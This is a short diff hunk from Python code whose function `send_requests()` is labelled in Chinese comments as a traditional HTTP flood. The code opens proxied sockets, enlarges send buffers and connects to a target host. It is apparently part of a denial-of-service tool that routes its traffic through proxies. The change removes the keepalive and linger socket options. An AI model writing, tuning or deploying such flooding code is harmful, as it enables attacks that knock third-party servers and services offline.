@@ -401,9 +401,7 @@ def send_requests(): #傳統HTTP FLOOD
         try:
             s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # 重複啟用端口 (非共用)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1) # 保持連線開啟
             s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 4096) # 加大傳送緩衝區 若設備帶寬不高請使用1024 * 1024
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0)) # 強制關閉socket 不必等待資料傳送
             s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
             s.connect((host, port))
             if port == 443:
